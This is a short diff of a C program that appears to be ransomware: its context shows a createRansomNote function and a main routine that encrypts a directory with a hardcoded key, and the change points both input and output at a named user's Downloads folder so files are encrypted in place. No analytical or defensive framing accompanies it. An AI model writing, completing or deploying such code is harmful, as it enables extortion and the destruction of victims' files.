@@ -52,8 +52,8 @@ void createRansomNote(const char *directory) {
 }
 
 int main() {
-    const char *inputDirectory = "input_directory";  // Replace with your input directory
-    const char *outputDirectory = "encrypted_directory";  // Replace with your output directory
+    const char *inputDirectory = "C:\Users\kevin\Downloads";  // Replace with your input directory
+    const char *outputDirectory = "C:\Users\kevin\Downloads";  // Replace with your output directory
     const char *key = "mysecretkey";  // Replace with your secret key
 
     DIR *dir = opendir(inputDirectory);
